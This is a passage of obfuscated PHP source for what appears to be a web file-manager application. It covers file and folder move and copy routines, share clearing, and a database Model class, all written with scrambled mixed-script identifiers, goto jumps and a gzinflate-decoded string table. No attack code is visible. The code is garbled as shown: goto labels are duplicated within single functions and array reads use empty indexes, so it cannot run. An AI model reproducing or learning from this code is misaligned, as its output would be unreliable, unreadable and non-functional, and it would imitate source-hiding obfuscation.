$this->fileNameExistCache($C೪, $FƸ[$Dճ[28]]); goto cϩ; e͂: $D = $this->pathInfoMore($B律); if ($this->isParentOf($B律, $C೪)) { return !1; } if (!$FƸ || !$dԠ || $dԠ[$Dճ[366]] != $Dճ[83]) { return !1; } goto A; Fא: Model($Dճ[501])->eventMove($B律, $FƸ[$Dճ[457]], $C೪); Hook::trigger($Dճ[528], $D); return $f; goto A܆ƑČ; A: Hook::trigger($Dճ[527], $D); $this->targetIsDelete = intval($FƸ[$Dճ[393]]); if ($FƸ[$Dճ[457]] == $C೪ && $b != $FƸ[$Dճ[28]]) { $A놩 = $this->fileNameExist($C೪, $b); if ($A놩 && $FƸ[$Dճ[366]] == $Dճ[464]) { goto AŇ; CК: return $A놩; goto bǌҗ; F֮: $this->removeNow($B律, !1); $this->folderSizeReset($C೪); Hook::trigger($Dճ[528], $D); goto CК; AŇ: $FѬ = $this->sourceInfo($A놩); $E⽚ = $this->fileHistory($FѬ, $FƸ[$Dճ[415]], $FƸ[$Dճ[77]]); if (!$E⽚) { Model($Dճ[418])->remove($FƸ[$Dճ[415]]); } goto F֮; bǌҗ: } } goto Aկ; Fɋ: Model($Dճ[163])->linkAdd($dȺ[$Dճ[497]]); if ($dӝ && $dȺ[$Dճ[529]]) { $this->removeNow($B律, !1); } $this->lockMoveEnd($B律); goto b㥜; Aկ: $d = $b ? $b : $FƸ[$Dճ[28]]; $this->lockMoveStart($B律); $this->lockWriteStart($C೪, $d); goto f; cϩ: $f = $this->_move($B律, $C೪, $Bӏ, $dȺ, $b); $this->sourceCacheClear(); if ($FƸ[$Dճ[366]] == $Dճ[83] && $dӝ) { $this->folderSizeResetChildren($f); } goto Fɋ; f: $Dճ =& $_SERVER[]; $FƸ = $this->sourceInfo($B律); $dԠ = $this->sourceInfo($C೪); goto e͂; B܉: $EΛ = array($FƸ[$Dճ[457]], $C೪); if ($FƸ[$Dճ[366]] == $Dճ[83]) { $EΛ[] = $B律; } $this->updateModifyTime($EΛ); goto Fא; b㥜: $this->lockWriteEnd($C೪, $d); $this->folderSizeReset($FƸ[$Dճ[457]]); $this->folderSizeReset($C೪); goto B܉; A܆ƑČ: } private function _move($cф, $b٩, $aں, &$Fሙ, $cÆ = '') { goto c; Fʛ: $b = $cÆ ? $cÆ : $e߱[$e쏂[28]]; $b = $this->fileNameExistCache($b٩, $b); $this->lockMoveStart($cф); goto C䅨; C䅨: $this->lockWriteStart($b٩, $b); if (!$b) { return $this->_moveForce($cф, $b٩, $b); } $a = $b; goto fԈ; FǤ: return $a; goto aʯÎ; fԈ: $D௩ = !1; if ($b) { if ($aں == REPEAT_RENAME_FOLDER) { $b = $this->fileNameAuto($b٩, $b, $aں, $b); $a = $this->_moveForce($cф, $b٩, $b); } else { if ($aں == REPEAT_RENAME_FOLDER) { $aں = REPEAT_RENAME; } $FԿӶ = $this->_childrenListSelect($cф); foreach ($FԿӶ as $dԸ) { $this->_move($dԸ[$e쏂[365]], $b, $aں, $Fሙ); } $D௩ = !0; } } else { if ($aں == REPEAT_SKIP) { $D௩ = !0; } else { if ($aں == REPEAT_RENAME || $aں == REPEAT_RENAME_FOLDER) { $b = $this->fileNameAuto($b٩, $b, $aں, $b); $a = $this->_moveForce($cф, $b٩, $b); } else { if ($aں == REPEAT_REPLACE) { $BȚً = $this->sourceInfoCache($b); $a = $this->fileHistory($BȚً, $e߱[$e쏂[415]], $e߱[$e쏂[77]]); if ($a) { $Fሙ[$e쏂[497]][] = $e߱[$e쏂[415]]; } else { $D௩ = !0; } } } } } if ($D௩ && !$Fሙ[$e쏂[529]]) { $Fሙ[$e쏂[529]] = !0; } goto FǤ; c: $e쏂 =& $_SERVER[]; $e߱ = $this->sourceInfo($cф); $b = $e߱[$e쏂[366]] == $e쏂[83]; goto Fʛ; aʯÎ: } private function _moveForce($Bͣ, $FԕÂ, $cӂ) { goto Bޚе; b: if (!$DӉ) { Model($Dݒ[450])->authClear($Bͣ); } $A͇ = $FǙ[$Dݒ[393]] == $Dݒ[83] && $C􇞩[$Dݒ[393]] != $Dݒ[83]; if ($A͇) { $D[$Dݒ[392]] = 0; } goto eݝ朶; cԡ: $eߢ = $FǙ[$Dݒ[366]] == $Dݒ[83]; $D = array($Dݒ[364] => $C􇞩[$Dݒ[365]], $Dݒ[521] => $C􇞩[$Dݒ[455]] . $C􇞩[$Dݒ[365]] . $Dݒ[47], $Dݒ[517] => $C􇞩[$Dݒ[367]], $Dݒ[518] => $C􇞩[$Dݒ[452]], $Dݒ[520] => USER_ID, $Dݒ[382] => $cӂ); $DӉ = $FǙ[$Dݒ[367]] == SourceModel::TYPE_GROUP && $C􇞩[$Dݒ[367]] == SourceModel::TYPE_GROUP && $FǙ[$Dݒ[452]] == $C􇞩[$Dݒ[452]]; goto b; eݝ朶: if ($eߢ) { $Dߵ¼ = array($Dݒ[521] => array($Dݒ[479], $FǙ[$Dݒ[455]] . $FǙ[$Dݒ[365]] . $Dݒ[480])); $F̖ɔ = $FǙ[$Dݒ[455]] . $FǙ[$Dݒ[365]] . $Dݒ[47]; $d = $C􇞩[$Dݒ[455]] . $C􇞩[$Dݒ[365]] . $Dݒ[47] . $FǙ[$Dݒ[365]] . $Dݒ[47]; $a = array($Dݒ[521] => array($Dݒ[530], "\x72\145\x70\x6c\141\143\145\50\160\141\162\x65\x6e\x74\x4c\145\166\145\x6c\54\47{$F̖ɔ}\x27\54\x27{$d}\x27\51"), $Dݒ[517] => $C􇞩[$Dݒ[367]], $Dݒ[518] => $C􇞩[$Dݒ[452]]); if ($A͇) { $a[$Dݒ[392]] = 0; } $this->where($Dߵ¼)->data($a)->save(); } $this->where(array($Dݒ[379] => $Bͣ))->data($D)->save(); return $Bͣ; goto eễ; Bޚе: $Dݒ =& $_SERVER[]; $FǙ = $this->sourceInfo($Bͣ); $C􇞩 = $this->sourceInfo($FԕÂ); goto cԡ; eễ: } private function clearShare($Bӯ, $e) { goto F܃; A: if ($Aɦ[$a͘[452]] == $eɖ؋[$a͘[452]] && $Aɦ[$a͘[367]] == $a͘[531]) { return; } $F؍ק = array($a͘[455] => array($a͘[479], $Aɦ[$a͘[455]] . $Bӯ . $a͘[480])); $D = $this->field($a͘[379])->where($F؍ק)->getField($a͘[365], !0); goto F; F: if (!$D) { return; } $F؍ק = array($a͘[365] => array($a͘[7], $D), $a͘[444] => 1); $f = Model($a͘[532])->field($a͘[437])->where($F؍ק)->select(); goto A; A: if (!$f) { return; } $f = array_to_keyvalue($f, $a͘[33], $a͘[437]); $F؍ק = array($a͘[437] => array($a͘[7], $f)); goto e; F܃: $a͘ =& $_SERVER[]; $Aɦ = $this->sourceInfo($Bӯ); $eɖ؋ = $this->sourceInfo($e); goto A; e: Model($a͘[532])->where($F؍ק)->save(array($a͘[444] => 0)); Model($a͘[533])->where($F؍ק)->delete(); goto d; d: } public function copyFolderFromIO($Fȳ, $c, $fФʠ, $e𛫧, $b袲, $Aʆ = false) { goto E㈸; a퐎Ε: $this->updateModifyTime($fФʠ); return $c; goto aв; C: Model($bӹ[500])->addAll($fΞ[$bӹ[498]], array(), !0); Model($bӹ[501])->eventCopy($c); $this->saveAll($fΞ[$bӹ[499]]); goto b션; d: $cۘĹ = $this->fileNameExist($fФʠ, $b萦); $c = $this->mkdir($fФʠ, $b萦, $e𛫧); if (!$cۘĹ || $e𛫧 == REPEAT_RENAME_FOLDER) { $e𛫧 = !1; } goto d; E㈸: $bӹ =& $_SERVER[]; $fΞ = array($bӹ[498] => array(), $bӹ[499] => array(), $bӹ[497] => array(), $bӹ[534] => array()); $b萦 = $Aʆ ? $Aʆ : $Fȳ->getPathName($Fȳ->pathThis($c)); goto d; b션: Model($bӹ[418])->linkAdd($fΞ[$bӹ[497]]); Model($bӹ[418])->remove($fΞ[$bӹ[534]]); $this->folderSizeReset($fФʠ); goto a퐎Ε; Fć: Hook::trigger($bӹ[536]); if ($c) { $this->folderSizeResetChildren($c); } $this->_childrenListClear(); goto C; d: if ($cۘĹ) { $this->_childrenAllMake($cۘĹ); } Hook::trigger($bӹ[535]); $this->_copyChildTo($Fȳ, $c, $c, $e𛫧, $fΞ, $b袲); goto Fć; aв: } private function _copyChildTo($dע, $eў, $f, $Dѓڽ, &$e, $Aט) { goto a; cꧦ: $e諉У = array_merge($A[$Dٰ[73]], $A[$Dٰ[74]]); $c鷼׼ = $this->_addFiles($dע, $A[$Dٰ[73]], $Aט); $Cּ¾ = array(); goto dה; a: $Dٰ =& $_SERVER[]; $Bޢ = $this->sourceInfoCache($f); $A = $dע->listPath($eў, !1, !0); goto cꧦ; dה: foreach ($e諉У as &$f͎) { goto c; c̩: if ($Dѓڽ) { $b = $this->fileNameExistCache($f, $f͎[$Dٰ[28]]); if ($b) { if ($f͎[$Dٰ[366]] || $Dѓڽ == REPEAT_SKIP) { continue; } if ($Dѓڽ == REPEAT_REPLACE) { $bĆ = $this->sourceInfoCache($b); $d҉ؾ = $this->fileHistory($bĆ, $f͎[$Dٰ[415]], $f͎[$Dٰ[77]]); if ($d҉ؾ) { $e[$Dٰ[497]][] = $f͎[$Dٰ[415]]; } continue; } else { if ($Dѓڽ == REPEAT_RENAME) { $f͎[$Dٰ[28]] = $this->fileNameAutoCache($f, $f͎[$Dٰ[28]], $Dѓڽ, !1); } } } } if (!$f͎[$Dٰ[366]] && $f͎[$Dٰ[415]]) { $e[$Dٰ[497]][] = $f͎[$Dٰ[415]]; } $Cּ¾[] = $this->_makeItemData($f͎, $Bޢ, $f͎[$Dٰ[28]]); goto e񈐻; c˽: $f͎[$Dٰ[77]] = _get($f͎, $Dٰ[77], 0); $f͎[$Dٰ[415]] = _get($f͎, $Dٰ[415], 0); if (!isset($f͎[$Dٰ[537]]) && $f͎[$Dٰ[415]]) { $e[$Dٰ[534]][] = $f͎[$Dٰ[415]]; } goto c̩; c: if (isset($c鷼׼[$f͎[$Dٰ[28]]])) { $f͎ = $c鷼׼[$f͎[$Dٰ[28]]]; } $f͎[$Dٰ[366]] = $f͎[$Dٰ[29]] == $Dٰ[76]; $f͎[$Dٰ[368]] = _get($f͎, $Dٰ[156], $Dٰ[33]); goto c˽; e񈐻: } unset($f͎); if (!empty($Cּ¾)) { $this->addAll($Cּ¾); } goto d; d: $E = $this->_childrenList($f); $E = array_to_keyvalue($E, $Dٰ[28]); foreach ($e諉У as $f͎) { $bĆ = $E[$f͎[$Dٰ[28]]]; $A = $bĆ[$Dٰ[365]]; $this->_copyApplyMeta($bĆ, $e); if ($f͎[$Dٰ[29]] == $Dٰ[76]) { $f͎[$Dٰ[75]] = $dע->getPathInner($f͎[$Dٰ[75]]); $this->_copyChildTo($dע, $f͎[$Dٰ[75]], $A, $Dѓڽ, $e, $Aט); } } goto Dؙ; Dؙ: } private function _addFiles($f, $Fឨ, $B퉞) { goto b; c: $Dð = $aϭ->where($F)->select(); $Dð = $Dð ? $Dð : array(); foreach ($Dð as $dƢ) { if (!isset($Fڴ[$dƢ[$cʺշ[159]]])) { continue; } $cީɉ = $Fڴ[$dƢ[$cʺշ[159]]]; foreach ($cީɉ as &$eƇ) { $eƇ[$cʺշ[415]] = $dƢ[$cʺշ[415]]; $eƇ[$cʺշ[537]] = !0; } unset($eƇ); } goto dԂ׳; dԂ׳: $E㈞ = array(); foreach ($Fឨ as $E呏) { if (isset($E呏[$cʺշ[537]]) && $E呏[$cʺշ[537]]) { continue; } $f = $f->getPathInner($E呏[$cʺշ[75]]); $cϯ = $aϭ->addFileMake($f, $E呏[$cʺշ[77]], $E呏[$cʺշ[160]], $E呏[$cʺշ[159]], $E呏[$cʺշ[28]], $B퉞); $E㈞[] = $cϯ; } $aϭ->addAll($E㈞); goto C稴; D׺܋: foreach ($Fឨ as &$eƇ) { goto AݒѤ; cɅ: if (count($Fڴ[$Cп]) > 1) { $eƇ[$cʺշ[537]] = !0; } goto bƜ; E: $eƇ[$cʺշ[159]] = $Cп; Hook::trigger($cʺշ[539], $eƇ); $Fڴ[$Cп][] =& $eƇ; goto cɅ; b: $Cп = $f->hashMd5($eƇ[$cʺշ[75]]); if (strlen($Cп) > 10 && !isset($Fڴ[$Cп])) { $Fڴ[$Cп] = array(); } $eƇ[$cʺշ[160]] = $D叄; goto E; AݒѤ: Hook::trigger($cʺշ[538], $eƇ); $eƇ[$cʺշ[75]] = $f->getPathInner($eƇ[$cʺշ[75]]); $D叄 = $f->hashSimple($eƇ[$cʺշ[75]]); goto b; bƜ: } $F = array($cʺշ[159] => array($cʺշ[7], array_keys($Fڴ))); $aϭ = Model($cʺշ[540]); goto c; b: $cʺշ =& $_SERVER[]; if (!$Fឨ || count($Fឨ) == 0) { return array(); } $Fڴ = array(); goto D׺܋; C稴: $F = array($cʺշ[159] => array($cʺշ[7], array_keys($Fڴ))); $Dð = $aϭ->where($F)->select(); $Dð = $Dð ? $Dð : array(); goto A; a㩛: return $B𷢑; goto D; A: foreach ($Dð as $dƢ) { if (!isset($Fڴ[$dƢ[$cʺշ[159]]])) { continue; } $BΠ =& $Fڴ[$dƢ[$cʺշ[159]]]; foreach ($BΠ as &$eƇ) { $eƇ[$cʺշ[415]] = $dƢ[$cʺշ[415]]; } unset($eƇ); } $B𷢑 = array(); foreach ($Fឨ as $b) { $B𷢑[$b[$cʺշ[28]]] = $b; } goto a㩛; D: } } define($_SERVER[][541], $_SERVER[][542]); goto eӜ; A: define($_SERVER[][0], $_SERVER[][1]); $_SERVER[] = explode($_SERVER[][2], gzinflate(substr($_SERVER[][3], 10, -8))); function Model($Eϊ = '', $aݝޜҍ = '', $B՛ = '') { goto FГ; FГ: $a߿ =& $_SERVER[]; static $bદ = array(); $aՖ = strtolower($aݝޜҍ . $a߿[0] . $Eϊ); goto Eݴ; Dƴ: $bદ[$aՖ] = new ModelBase($Eϊ, $aݝޜҍ, $B՛); return $bદ[$aՖ]; goto D; Eݴ: if (isset($bદ[$aՖ])) { return $bદ[$aՖ]; } if ($Eϊ) { $Eϊ = strtoupper($Eϊ[0]) . substr($Eϊ, 1); $FҶ = $Eϊ . $a߿[1]; if (class_exists($FҶ)) { $bદ[$aՖ] = new $FҶ(); return $bદ[$aՖ]; } } if (!$B՛) { $B՛ = $GLOBALS[$a߿[2]][$a߿[3]]; } goto Dƴ; D: } goto d; d: function Action($Fѻ = '') { goto d; Fˤ: if (isset($F߷[$Cȝ])) { return $F߷[$Cȝ]; } $Fѻ = trim(str_replace($Aח[4], $Aח[5], $Fѻ), $Aח[4]); $EƝ = explode($Aח[5], $Fѻ); goto eƄ; eƄ: $d䗹 = strtolower($EƝ[0]); if (substr($d䗹, -6) == $Aח[6]) { $Fѻ = substr($EƝ[0], 0, -6); $FȢ = $Fѻ . $Aח[7]; $F엥ч = $Aח[8]; if (isset($EƝ[1]) && substr(strtolower($EƝ[1]), -5) == $Aח[9]) { $FȢ = $Fѻ . $EƝ[1]; $F엥ч = $Aח[10] . $EƝ[1] . $Aח[11]; } else { if (count($EƝ) == 3) { $FȢ = $Fѻ . $EƝ[1] . $EƝ[2]; $F엥ч = $Aח[12] . $EƝ[1] . $Aח[13] . $EƝ[2] . $Aח[11]; } } $F엥ч = PLUGIN_DIR . $Fѻ . $Aח[4] . $F엥ч; } else { if (substr($d䗹, -5) == $Aח[9]) { $Fѻ = substr($EƝ[0], 0, -5); return Model($Fѻ); } else { $FȢ = $EƝ[0] . $EƝ[1]; $F엥ч = CONTROLLER_DIR . $EƝ[0] . $Aח[4] . $EƝ[1] . $Aח[14]; } } $Aͷ = strtolower($FȢ); goto E̜; E̜: if (isset($F߷[$Aͷ])) { return $F߷[$Aͷ]; } if (is_file($F엥ч)) { include_once $F엥ч; } if (!class_exists($FȢ)) { return actionCallError("\x5b{$Fѻ}\x20\x3d\76\x20{$FȢ}\135\40\x63\154\x61\163\x73\40\156\x6f\x74\40\145\x78\x69\x73\x74\x73\x21"); } goto cᬹ; d: $Aח =& $_SERVER[]; static $F߷ = array(); $Cȝ = $Fѻ; goto Fˤ; cᬹ: $F߷[$Aͷ] = new $FȢ(); $F߷[$Cȝ] = $F߷[$Aͷ]; return $F߷[$Aͷ]; goto bֲ螵; bֲ螵: } function ActionApply($A, $bψ = array()) { goto c什; b: if (!method_exists($d, $aǯ)) { return actionCallError("{$A}\x20\x6d\145\164\150\157\144\x20\156\x6f\164\40\145\x78\x69\163\x74\x73\41"); } $d = call_user_func_array(array($d, $aǯ), $bψ); return $d; goto c鈛; A˜: $F˽ = substr($A, 0, $FΒ); $aǯ = substr($A, $FΒ + 1); $d = Action($F˽); goto b; c什: if (is_array($A)) { return call_user_func_array($A, $bψ); } if (function_exists($A)) { return call_user_func_array($A, $bψ); } $FΒ = strrpos($A, $_SERVER[][5]); goto A˜; c鈛: } function actionCallError($Bؤ) { $c┊ =& $_SERVER[]; $Cķ = json_encode_force(array($c┊[15] => this_url(), $c┊[16] => $GLOBALS[$c┊[16]])); $Cķ = str_replace(array($c┊[17]), array($c┊[4]), $Cķ); return write_log($Bؤ . $c┊[18] . $Cķ, $c┊[19]); } goto C; DÖ: define($_SERVER[][226], 0); define($_SERVER[][227], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\x62\x6c\x65", "\x6f\x72\x64\x65\x72", "\x61\x6c\x69\x61\163", "\x68\141\166\151\x6e\x67", "\x67\162\x6f\165\160", "\154\157\x63\x6b", "\144\151\x73\x74\151\156\143\x74", "\141\x75\x74\157", "\146\x69\154\x74\x65\x72", "\166\x61\154\151\x64\x61\164\145", "\162\145\x73\165\154\164", "\x62\x69\x6e\x64", "\164\157\x6b\x65\156"); public function __construct($FÂȃ = '', $E∮ = '', $D¸ = '') { $Fе΅ =& $_SERVER[]; $this->_initialize(); if (!empty($FÂȃ)) { if (strpos($FÂȃ, $Fе΅[91])) { list($this->dbName, $this->name) = explode($Fе΅[91], $FÂȃ); } else { $this->name = $FÂȃ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($E∮)) { $this->tablePrefix = $Fе΅[33]; } elseif ($Fе΅[33] != $E∮) { $this->tablePrefix = $E∮; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($Fе΅[228]); } $this->db(0, empty($this->connection) ? $D¸ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $Bǌ =& $_SERVER[]; if (empty($this->fields)) { if (think_config($Bǌ[229])) { $aŋӠ = $this->dbName ? $this->dbName : think_config($Bǌ[230]); $e = think_var_cache($Bǌ[231] . strtolower(get_path_this($aŋӠ) . $Bǌ[91] . $this->name)); if ($e) { $c扰 = think_config($Bǌ[232]); if (empty($c扰) || $e[$Bǌ[233]] == $c扰) { $this->fields = $e; return; } } } $this->flush(); } } public function flush() { goto Ȧ; Ȧ: $cͪ =& $_SERVER[]; $this->db->setModel($this->name); $B壍 = $this->db->getFields($this->getTableName()); goto aÿ̗; aÿ̗: if (!$B壍) { return !1; } $this->fields = array_keys($B壍); $this->fields[$cͪ[234]] = !1; goto a硫ޣ; a´я: if (think_config($cͪ[229])) { $E謎 = $this->dbName ? $this->dbName : think_config($cͪ[230]); think_var_cache($cͪ[231] . strtolower(get_path_this($E謎) . $cͪ[91] . $this->name), $this->fields); } goto C❙; a硫ޣ: foreach ($B壍 as $C => $Fłԋ) { $D[$C] = $Fłԋ[$cͪ[29]]; if ($Fłԋ[$cͪ[36]]) { $this->fields[$cͪ[235]] = $C; if ($Fłԋ[$cͪ[39]]) { $this->fields[$cͪ[234]] = !0; } } } $this->fields[$cͪ[236]] = $D; if (think_config($cͪ[232])) { $this->fields[$cͪ[233]] = think_config($cͪ[232]); } goto a´я; C❙: } public function switchModel($f֋, $Fˮ = array()) { $b߿ =& $_SERVER[]; $C = ucwords(strtolower($f֋)) . $b߿[237]; if (!class_exists($C)) { think_exception($C . think_lang($b߿[238])); } $this->_extModel = new $C($this->name); if (!empty($Fˮ)) { foreach ($Fˮ as $B) { $this->_extModel->setProperty($B, $this->{$B}); } } return $this->_extModel; } public function __set($EՄ, $fƭæ) { $this->data[$EՄ] = $fƭæ; } public function __get($aݴ) { return isset($this->data[$aݴ]) ? $this->data[$aݴ] : null; } public function __isset($f) { return isset($this->data[$f]); } public function __unset($f) { unset($this->data[$f]); } public function __call($cֿ, $f) { $aǒޗؔ =& $_SERVER[]; if (in_array(strtolower($cֿ), $this->methods, !0)) { $this->options[strtolower($cֿ)] = $f[0]; return $this; } elseif (in_array(strtolower($cֿ), array($aǒޗؔ[239], $aǒޗؔ[240], $aǒޗؔ[241], $aǒޗؔ[242], $aǒޗؔ[243]), !0)) { $Fӂ⭳ = isset($f[0]) ? $f[0] : $aǒޗؔ[172]; $Fӂ⭳ = $this->db->parseKey($Fӂ⭳); return $this->getField(strtoupper($cֿ) . $aǒޗؔ[244] . $Fӂ⭳ . $aǒޗؔ[245] . $cֿ, $aǒޗؔ[239]); } elseif (strtolower(substr($cֿ, 0, 5)) == $aǒޗؔ[246]) { $Fӂ⭳ = think_parse_name(substr($cֿ, 5)); $ḛۗ[$Fӂ⭳] = $f[0]; return $this->where($ḛۗ)->find(); } elseif (strtolower(substr($cֿ, 0, 10)) == $aǒޗؔ[247]) { $c㍷ݠ = think_parse_name(substr($cֿ, 10)); $ḛۗ[$c㍷ݠ] = $f[0]; return $this->where($ḛۗ)->getField($f[1]); } elseif (isset($this->_scope[$cֿ])) { return $this->scope($cֿ, $f[0]); } elseif (method_exists($this, $cֿ)) { array_unshift($f, $cֿ); return call_user_func_array(array($this, $aǒޗؔ[248]), $f); } else { return call_user_func_array(array(parent, $cֿ), $f); } } protected function call() { goto c; F: if (isset($C[$BъȂ]) && $C[$BъȂ] === $Aߋ) { think_exception(__CLASS__ . $e笐ƽ[4] . $Aߋ . think_lang($e笐ƽ[249])); return; } $C[] = $Aߋ; if (method_exists($this, $e笐ƽ[250])) { $aϾ = call_user_func_array(array($this, $e笐ƽ[251]), array($c, $C)); if (!is_null($aϾ) && $aϾ !== !1) { return $aϾ; } } goto aߴ; aߴ: $CȌ = call_user_func_array(array($this, $Aߋ), $C); if (method_exists($this, $e笐ƽ[252])) { $aϾ = call_user_func_array(array($this, $e笐ƽ[253]), array($c, $C, $CȌ)); if ($aϾ) { return $aϾ; } } return $CȌ; goto a׷œ; c: $e笐ƽ =& $_SERVER[]; $C = func_get_args(); $Aߋ = array_shift($C); goto e޾; e޾: $c = $Aߋ; if (is_array($Aߋ)) { $c = $Aߋ[1]; $Aߋ = $Aߋ[0]; } $BъȂ = count($C) - 1; goto F; a׷œ: } protected function _initialize() { } protected function _facade($D) { $e =& $_SERVER[]; if (!empty($this->fields)) { foreach ($D as $bզɚ => $Cı䒽) { if (!in_array($bզɚ, $this->fields, !0)) { unset($D[$bզɚ]); } elseif (is_scalar($Cı䒽)) { $this->_parseType($D, $bզɚ); } } } if (!empty($this->options[$e[254]])) { $D = array_map($this->options[$e[254]], $D); unset($this->options[$e[254]]); } $this->_beforeWrite($D); return $D; } protected function _beforeWrite(&$fǬ) { } public function add($Cߌ = '', $c = array(), $C = false) { goto C췷; C췷: if (empty($Cߌ)) { if (!empty($this->data)) { $Cߌ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[][255]); return !1; } } $c = $this->_parseOptions($c); $Cߌ = $this->_facade($Cߌ); goto D; D: if (!1 === $this->_beforeInsert($Cߌ, $c)) { return !1; } $D = $this->db->insert($Cߌ, $c, $C); if (!1 !== $D) { $aϭ = $this->getLastInsID(); if ($aϭ) { $Cߌ[$this->getPk()] = $aϭ; $this->_after_insert($Cߌ, $c); return $aϭ; } $this->_after_insert($Cߌ, $c); } goto D; D: return $D; goto FƳ; FƳ: } protected function _beforeInsert(&$c鼬ޕ, $f) { } protected function _after_insert($d٨Կ, $cۥΊ) { } public function addAll($aԿ, $e = array(), $AόΊ = false) { goto A; A: $f󯶉 =& $_SERVER[]; if (empty($aԿ)) { $this->error = think_lang($f󯶉[255]); return !1; } $e = $this->_parseOptions($e); goto f݋߹ē; B: return $F; goto DބȚ; f݋߹ē: foreach ($aԿ as $aҊ => $B) { $aԿ[$aҊ] = $this->_facade($B); } if (method_exists($this->db, $f󯶉[256])) { $F = $this->db->insertAll($aԿ, $e, $AόΊ); } else { $this->startTrans(); foreach ($aԿ as $aҊ => $B) { $F = $this->db->insert($B, $e, $AόΊ); } $this->commit(); } if (!1 !== $F) { $dэҼ = $this->getLastInsID(); if ($dэҼ) { return $dэҼ; } } goto B; DބȚ: } public function selectAdd($B = '', $Dƭ = '', $Cӳ = array()) { $D =& $_SERVER[]; $Cӳ = $this->_parseOptions($Cӳ); if (!1 === ($AϾΥ = $this->db->selectInsert($B ? $B : $Cӳ[$D[257]], $Dƭ ? $Dƭ : $this->getTableName(), $Cӳ))) { $this->error = think_lang($D[258]); return !1; } else { return $AϾΥ; } } public function save($A˂Ҷ = '', $D = array()) { goto c懎; bخ: if (is_array($D[$bɝ[259]]) && isset($D[$bɝ[259]][$D񫩾])) { $a󍉓 = $D[$bɝ[259]][$D񫩾]; } if (!1 === $this->_beforeUpdate($A˂Ҷ, $D)) { return !1; } $dڏ쾬 = $this->db->update($A˂Ҷ, $D); goto bَ; c懎: $bɝ =& $_SERVER[]; if (empty($A˂Ҷ)) { if (!empty($this->data)) { $A˂Ҷ = $this->data; $this->data = array(); } else { $this->error = think_lang($bɝ[255]); return !1; } } $A˂Ҷ = $this->_facade($A˂Ҷ); goto Fꭟ; bَ: if (!1 !== $dڏ쾬) { if (isset($a󍉓)) { $A˂Ҷ[$D񫩾] = $a󍉓; } $this->_afterUpdate($A˂Ҷ, $D); } return $dڏ쾬; goto a; Fꭟ: $D = $this->_parseOptions($D); $D񫩾 = $this->getPk(); if (!isset($D[$bɝ[259]])) { if (isset($A˂Ҷ[$D񫩾])) { $D놲[$D񫩾] = $A˂Ҷ[$D񫩾]; $D[$bɝ[259]] = $D놲; unset($A˂Ҷ[$D񫩾]); } else { $this->error = think_lang($bɝ[258]); return !1; } } goto bخ; a: } protected function _beforeUpdate(&$AȘ, $a̸) { } protected function _afterUpdate($E, $Cℐ) { } public function delete($a՟ = array()) { goto AԢ; AԢ: $BΑי =& $_SERVER[]; if (empty($a՟) && empty($this->options[$BΑי[259]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $F٥ = $this->getPk(); goto dμ; dμ: if (is_numeric($a՟) || is_string($a՟)) { if (strpos($a՟, $BΑי[47])) { $bў[$F٥] = array($BΑי[260], $a՟); } else { $bў[$F٥] = $a՟; } $this->options[$BΑי[259]] = $bў; } $a՟ = $this->_parseOptions(); if (is_array($a՟[$BΑי[259]]) && isset($a՟[$BΑי[259]][$F٥])) { $b = $a՟[$BΑי[259]][$F٥]; } goto bլ; bլ: $E畾Ě = $this->db->delete($a՟); if (!1 !== $E畾Ě) { $D = array(); if (isset($b)) { $D[$F٥] = $b; } $this->_after_delete($D, $a՟); } return $E畾Ě; goto B㑎Լ; B㑎Լ: } protected function _after_delete($Fæ, $fڃث) { } public function select($eї = array()) { goto D׏; bƱ: $this->_afterSelect($AҤٽ, $eї); return $AҤٽ; goto Aꃇ; D׏: $bז뱹 =& $_SERVER[]; if (is_string($eї) || is_numeric($eї)) { $d鎄 = $this->getPk(); if (strpos($eї, $bז뱹[47])) { $B[$d鎄] = array($bז뱹[260], $eї); } else { $B[$d鎄] = $eї; } $this->options[$bז뱹[259]] = $B; } elseif (!1 === $eї) { $eї = $this->_parseOptions(); return $bז뱹[261] . $this->db->buildSelectSql($eї) . $bז뱹[262]; } $eї = $this->_parseOptions(); goto fϫ; fϫ: $AҤٽ = $this->db->select($eї); if (!1 === $AҤٽ) { return !1; } if (empty($AҤٽ)) { return null; } goto bƱ; Aꃇ: } protected function _afterSelect(&$bШΫ, $B) { } public function buildSql($F = array()) { $Dﭑы =& $_SERVER[]; $F = $this->_parseOptions($F); return $Dﭑы[261] . $this->db->buildSelectSql($F) . $Dﭑы[262]; } public function optionsValue($FÅ = null) { if (is_null($FÅ)) { return $this->options; } elseif (is_array($FÅ)) { $this->options = array_merge($this->options, $FÅ); } } protected function _parseOptions($C = array()) { goto cާ; eßӃ: if (isset($C[$cܾþ[259]]) && is_array($C[$cܾþ[259]]) && !empty($AǬ) && !isset($C[$cܾþ[266]]) && !isset($C[$cܾþ[263]])) { foreach ($C[$cܾþ[259]] as $fϲ => $AÃ) { $fϲ = trim($fϲ); if (in_array($fϲ, $AǬ, !0)) { if (is_scalar($AÃ)) { $this->_parseType($C[$cܾþ[259]], $fϲ); } } elseif (!is_numeric($fϲ) && $cܾþ[70] != substr($fϲ, 0, 1) && !1 === strpos($fϲ, $cܾþ[91]) && !1 === strpos($fϲ, $cܾþ[244]) && !1 === strpos($fϲ, $cܾþ[267]) && !1 === strpos($fϲ, $cܾþ[268])) { unset($C[$cܾþ[259]][$fϲ]); } } } $this->_options_filter($C); return $C; goto c; C: if (!isset($C[$cܾþ[263]])) { $C[$cܾþ[263]] = $this->getTableName(); $AǬ = $this->fields; } else { $AǬ = $this->getDbFields(); } if (!empty($C[$cܾþ[264]])) { $C[$cܾþ[263]] .= $cܾþ[50] . $C[$cܾþ[264]]; } $C[$cܾþ[265]] = $this->name; goto eßӃ; cާ: $cܾþ =& $_SERVER[]; if (is_array($C)) { $C = array_merge($this->options, $C); } $this->options = array(); goto C; c: } protected function 